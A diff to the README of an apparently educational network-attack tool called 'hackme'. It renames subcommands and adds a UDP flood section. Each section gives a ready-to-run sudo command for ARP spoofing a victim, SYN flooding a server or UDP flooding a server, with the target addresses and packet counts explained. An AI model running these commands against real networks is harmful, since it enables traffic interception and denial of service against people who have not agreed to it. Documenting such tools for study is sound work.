@@ -32,6 +32,8 @@ To get the attack description in the terminal, enter `hackme <attack> --desc`
 
 # Implemented Attacks
 
+The following commands include the `--debug` option, which is not required to execute an attack.
+
 ## ARP Spoofing
 
 You can read about ARP spoofing attack [here](https://www.wikiwand.com/en/ARP_spoofing).
@@ -39,7 +41,7 @@ You can read about ARP spoofing attack [here](https://www.wikiwand.com/en/ARP_sp
 Example usage:
 
 ```bash
-$ sudo hackme arp_spoof -i wlp2s0 -m aa:aa:aa:aa:aa:aa -gm BB-BB-BB-BB-BB-BB -gip 192.168.0.1 -vm cc:cc:cc:cc:cc:cc -vip 192.168.0.108
+$ sudo hackme --debug arpspoof -i wlp2s0 -m aa:aa:aa:aa:aa:aa -gm BB-BB-BB-BB-BB-BB -gip 192.168.0.1 -vm cc:cc:cc:cc:cc:cc -vip 192.168.0.108
 ```
 where:
 * `wlp22s0` — your network interface
@@ -49,7 +51,7 @@ where:
 * `cc:cc:cc:cc:cc:cc` — the victim's MAC-address
 * `192.168.0.108` — the victim's IP-address
 
-Run `sudo hackme arp_spoof --help` to get more information.
+Run `sudo hackme arpspoof --help` to get more information.
 
 ## SYN Flood
 
@@ -57,12 +59,27 @@ You can read about SYN flood attack [here](https://www.wikiwand.com/en/SYN_flood
 
 Example usage:
 ```bash
-$ sudo hackme syn_flood -d 172.17.17.10 -p 443 -c 1000
+$ sudo hackme --debug synflood -d 172.17.17.10 -p 443 -c 1000
 ```
 where:
 * `172.17.17.10` — server's IP-address
 * `443` — server's port
 * `1000` — the number of packets to be sent
 
-Run `sudo hackme syn_flood --help` to get more information.
+Run `sudo hackme synflood --help` to get more information.
+
+## UDP Flood
+
+You can read about UDP flood attack [here](https://www.wikiwand.com/en/UDP_flood).
+
+Example usage:
+```bash
+$ sudo hackme --debug udpflood -d 172.17.17.10 -p 53 -c 1000
+```
+where:
+* `172.17.17.10` — server's IP-address
+* `53` — server's port
+* `1000` — the number of packets to be sent
+
+Run `sudo hackme udpflood --help` to get more information.
 
